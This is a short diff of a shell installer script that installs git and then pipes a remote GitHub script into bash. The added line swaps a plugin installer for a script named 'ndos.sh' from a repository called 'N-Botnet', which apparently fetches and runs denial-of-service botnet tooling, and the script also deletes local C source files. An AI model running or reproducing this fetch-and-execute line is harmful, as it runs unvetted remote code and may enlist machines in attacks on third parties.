@@ -4,7 +4,7 @@ apt update
 apt install git -y
 clear
 sleep 5
-bash <(curl -s https://raw.githubusercontent.com/anhnoine/n-manios/refs/heads/main/nPlugins/nplugin_install.sh)
+bash <(curl -s https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/ndos.sh)
 rm nSocks.c
 rm n-args.c
 clear
